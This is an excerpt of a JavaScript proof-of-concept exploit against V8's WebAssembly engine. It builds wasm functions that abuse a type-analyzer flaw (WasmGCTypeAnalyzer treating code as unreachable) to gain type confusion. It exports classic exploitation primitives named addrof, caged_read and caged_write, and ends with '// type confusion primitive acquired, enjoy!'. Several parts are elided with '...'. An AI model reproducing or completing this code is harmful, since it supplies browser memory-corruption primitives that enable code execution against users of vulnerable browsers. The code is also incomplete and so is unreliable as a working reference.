...
builder.addFunction('transfer', kSig_v_v).addBody([
  ...wasmI32Const(0),
  kExprTableGet, $t.index,
  kExprGlobalSet, $glob.index,
]).exportFunc();

// mark as unreachable in typer via WasmGCTypeAnalyzer::ProcessAssertNotNull() -> WasmGCTypeAnalyzer::RefineTypeKnowledge()
let typer_unreachable = [
  kExprGlobalGet, $glob.index,
  kExprRefAsNonNull,
  kExprDrop,
];
...
let {table, global, dummy_s1, transfer, confuser, addrof, caged_read, caged_write} = instance.exports;
...
// type confusion primitive acquired, enjoy!
